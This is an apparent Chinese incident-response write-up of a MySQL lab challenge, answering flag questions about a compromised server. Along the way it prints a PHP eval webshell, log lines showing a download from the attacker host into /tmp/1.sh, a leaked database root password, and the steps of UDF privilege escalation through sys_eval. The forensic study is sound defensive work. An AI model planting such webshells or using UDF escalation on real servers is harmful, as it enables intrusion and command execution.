---
title: 玄机-第二章 日志分析-mysql应急响应
published: 2025-03-28 23:56:28

tags: [玄机,应急响应]
category: 靶机
draft: false
---
# 第二章 日志分析-mysql应急响应

1. 黑客第一次写入的`shell flag`{关键字符串} 
通过Mysql写入shell应该是写入`Webshell` ，那么我们要去网站目录找
    
    ```bash
    root@xuanji:/var/www/html# grep -rE '@eval' ./
    ./sh.php:1      2       <?php @eval($_POST['a']);?>     4
    ```
    
    查看以下`./sh.php`
    
    ```bash
    root@xuanji:/var/www/html# cat ./sh.php 
    1       2       <?php @eval($_POST['a']);?>     4
    //ccfda79e-7aa1-4275-bc26-a6189eb9a20b
    ```
    
    那么第一个Flag就是
    
    ```bash
    flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
    ```
    
2. 黑客反弹 shell 的ip，flag{ip}
    
    寻找数据库日志，发现只有`error.log`
    
    ```bash
    root@xuanji:/var/log/mysql# ls -al
    total 8
    drwxr-s---. 1 mysql adm      23 Jul 31  2023 .
    drwxrwxr-x. 1 root  syslog   46 Jul 31  2023 ..
    -rw-rw----. 1 mysql adm    6238 Mar 26 15:10 error.log
    ```
    
    查看，可以在里面找到一个IP，`192.168.100.13`
    
    ```bash
    230731 10:14:49 [Note] /usr/sbin/mysqld: ready for connections.
    Version: '5.5.64-MariaDB-1ubuntu0.14.04.1'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
    sh: 1: curl: not found
    --2023-08-01 02:14:11--  http://192.168.100.13:771/
    Connecting to 192.168.100.13:771... connected.
    HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
    Length: unspecified
    Saving to: 'index.html'
    
         0K                                                        2.46 =2.0s
    
    2023-08-01 02:14:13 (2.46 B/s) - 'index.html' saved [5]
    
    /tmp/1.sh: line 1: --2023-08-01: command not found
    ```
    
    那么Flag就是
    
    ```bash
    flag{192.168.100.13}
    ```
    
3. 黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx
    
    假如我们是黑客，黑到了服务器是普通用户，然后需要提权，我们应该想会去找密码，例如数据库密码，并且假如数据库的用户是`root`并且`secure_file_priv` 为空，则就可以使用`UDF`提权
    
    先去找数据库账户密码，在`common.php`中可以找到
    
    ```bash
    root@xuanji:/var/www/html# cat common.php 
    <?php
    $conn=mysqli_connect("localhost","root","334cc35b3c704593","cms","3306");
    if(!$conn){
    echo "数据库连接失败";
    }
    ```
    
    登录数据库后，查看插件目录路径
    
    ```bash
    MariaDB [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
    +------------------+-------+
    | Variable_name    | Value |
    +------------------+-------+
    | secure_file_priv |       |
    +------------------+-------+
    1 row in set (0.00 sec)
    ```
    
    是为空，则会有`UDF`提权，那么在`/usr/lib/mysql/plugin` 可能就会留下痕迹
    
    ```bash
    root@xuanji:/tmp# ls -al /usr/lib/mysql/plugin/
    total 4752
    drwxr-xr-x. 1 mysql mysql      39 Aug  1  2023 .
    drwxr-xr-x. 1 root  root       20 Jul 31  2023 ..
    -rw-r--r--. 1 mysql mysql   10416 May 16  2019 auth_pam.so
    -rw-r--r--. 1 mysql mysql    6464 May 16  2019 auth_socket.so
    -rw-r--r--. 1 mysql mysql   10200 May 16  2019 dialog.so
    -rw-r--r--. 1 mysql mysql 1600136 May 16  2019 ha_innodb.so
    -rw-r--r--. 1 mysql mysql  159304 May 16  2019 handlersocket.so
    -rw-r--r--. 1 mysql mysql    6104 May 16  2019 mysql_clear_password.so
    -rw-rw-rw-. 1 mysql mysql   10754 Aug  1  2023 mysqludf.so
    -rw-r--r--. 1 mysql mysql   39944 May 16  2019 semisync_master.so
    -rw-r--r--. 1 mysql mysql   14736 May 16  2019 semisync_slave.so
    -rw-r--r--. 1 mysql mysql   55696 May 16  2019 server_audit.so
    -rw-r--r--. 1 mysql mysql 2918008 May 16  2019 sphinx.so
    -rw-r--r--. 1 mysql mysql   11008 May 16  2019 sql_errlog.so
    -rw-rw-rw-. 1 mysql mysql      34 Aug  1  2023 udf.so
    ```
    
    很明显，`udf.so` 是提权的文件
    
    那么`Flag`就是
    
    ```bash
    root@xuanji:/tmp# echo -n "/usr/lib/mysql/plugin/udf.so" | md5sum
    b1818bde4e310f3d23f1005185b973e7  -
    ```
    
    ```bash
    flag{b1818bde4e310f3d23f1005185b973e7}
    ```
    
4. 黑客获取的权限 flag{whoami后的值}
    
    我们直接去找自定义函数
    
    ```bash
    MariaDB [(none)]> select * from mysql.func;
    +----------+-----+-------------+----------+
    | name     | ret | dl          | type     |
    +----------+-----+-------------+----------+
    | sys_eval |   0 | mysqludf.so | function |
    +----------+-----+-------------+----------+
    1 row in set (0.00 sec)
    ```
    
    使用自定义函数执行`whoami`
    
    ```bash
    MariaDB [(none)]> select sys_eval('whoami');
    +--------------------+
    | sys_eval('whoami') |
    +--------------------+
    | mysql
                 |
    +--------------------+
    1 row in set (0.00 sec)
    ```
    
    ```bash
    flag{mysql}
    ```